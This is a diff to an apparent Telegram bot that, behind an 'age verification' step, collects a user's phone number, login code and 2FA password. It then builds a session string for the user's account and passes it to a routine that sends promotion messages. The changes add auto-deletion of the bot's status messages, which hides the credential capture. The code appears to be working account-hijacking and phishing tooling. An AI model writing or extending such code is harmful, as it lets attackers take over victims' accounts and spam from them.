@@ -145,9 +145,8 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
-    # Remove verify age keyboard
-    await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
-    await asyncio.sleep(1)
+    # Send & auto-delete "Processing..." message
+    processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
     
     phone_number = message.contact.phone_number
     if not phone_number.startswith('+'):
@@ -162,16 +161,20 @@ async def handle_contact(bot: Client, message: Message):
             'phone_number': phone_number,
             'client': client,
             'phone_code_hash': code.phone_code_hash,
-            'otp_digits': ''
+            'otp_digits': '',
+            'processing_msg_id': processing_msg.id  # Store msg ID for deletion
         }
-        # Clear previous messages
-        await message.delete()
+        
         sent_msg = await bot.send_message(
             user_id,
             "**OTP Sent!**\n\nEnter code via buttons:",
             reply_markup=OTP_KEYBOARD
         )
         user_states[user_id]['last_msg_id'] = sent_msg.id
+        
+        # Delete "Processing..." after OTP is sent
+        await bot.delete_messages(user_id, processing_msg.id)
+        
     except Exception as e:
         await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
@@ -203,6 +206,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
         except SessionPasswordNeeded:
             await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
             state['needs_password'] = True
+            state['last_msg_id'] = query.message.id  # Store for deletion
         except Exception as e:
             await query.message.reply(f"Error: {e}\n/login again.")
             await cleanup_user_state(user_id)
@@ -227,9 +231,18 @@ async def handle_2fa_password(bot: Client, message: Message):
     state = user_states[user_id]
     
     try:
+        # Delete the "2FA REQUIRED" message first
+        if 'last_msg_id' in state:
+            await bot.delete_messages(user_id, state['last_msg_id'])
+        
         await state['client'].check_password(password=password)
-        await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
+        verified_msg = await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
+        
+        # Store verified_msg ID for deletion after session creation
+        state['verified_msg_id'] = verified_msg.id
+        
         await create_session(bot, state['client'], user_id, state['phone_number'])
+        
     except PasswordHashInvalid:
         await message.reply('**Invalid Password**\n/login again', reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
@@ -273,6 +286,10 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         # Remove local copy
         os.remove(session_file)
 
+        # Delete "Password verified..." message after sending success
+        if 'verified_msg_id' in user_states[user_id]:
+            await bot.delete_messages(user_id, user_states[user_id]['verified_msg_id'])
+        
         await bot.send_message(user_id, strings['verification_success'])
         asyncio.create_task(send_promotion_messages(bot, string_session))
         
